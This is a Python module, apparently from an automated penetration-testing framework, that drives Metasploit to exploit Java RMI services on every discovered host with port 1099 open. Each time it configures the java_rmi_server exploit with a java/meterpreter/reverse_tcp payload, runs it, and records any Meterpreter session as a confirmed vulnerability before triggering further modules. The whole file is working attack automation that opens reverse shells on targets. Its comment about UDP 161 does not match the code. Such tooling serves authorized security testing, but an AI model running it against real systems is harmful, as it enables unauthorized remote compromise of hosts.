import re

from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.mymsf import myMsf
from core.utils import Utils


class msf_javarmi(actionModule):
    def __init__(self, config, display, lock):
        super(msf_javarmi, self).__init__(config, display, lock)
        self.triggers = ["newPort1099"]
        self.requirements = ["msfconsole"]
        self.title = "Attempt to Exploit A Java RMI Service"
        self.shortName = "MSFJavaRMI"
        self.description = "execute [exploit/multi/misc/java_rmi_server] on each target"
        self.safeLevel = 5

    def getTargets(self):
        # we are interested only in the hosts that have UDP 161 open
        self.targets = kb.get('host/*/tcpport/1099')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # connect to msfrpc
            msf = myMsf(host=self.config['msfhost'], port=int(self.config['msfport']), user=self.config['msfuser'],
                        password=self.config['msfpass'])
            # If any results are succesful, this will become true and Fire will be called in the end
            callFire = False
            # loop over each target
            for t in self.targets:
                # verify we have not tested this host before
                if not self.seentarget(t):
                    # add the new IP to the already seen list
                    self.addseentarget(t)
                    self.display.verbose(self.shortName + " - Connecting to " + t)
                    msf.execute("use exploit/multi/misc/java_rmi_server\n")
                    msf.execute("set RHOSTS %s\n" % t)
                    msf.execute("set TARGET 0\n")
                    msf.execute("set PAYLOAD java/meterpreter/reverse_tcp\n")
                    msf.execute("run\n")
                    msf.sleep(5)

                    outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)
                    result = msf.getResult()
                    Utils.writeFile(result, outfile)

                    parts = re.findall(".*Meterpreter session.*", result)
                    for part in parts:
                        callFire = True
                        self.addVuln(t, "JavaRMI", {"port":"1099"})

            if callFire:
                self.fire("msfSession")

            # clean up after ourselves
            result = msf.cleanup()

        return
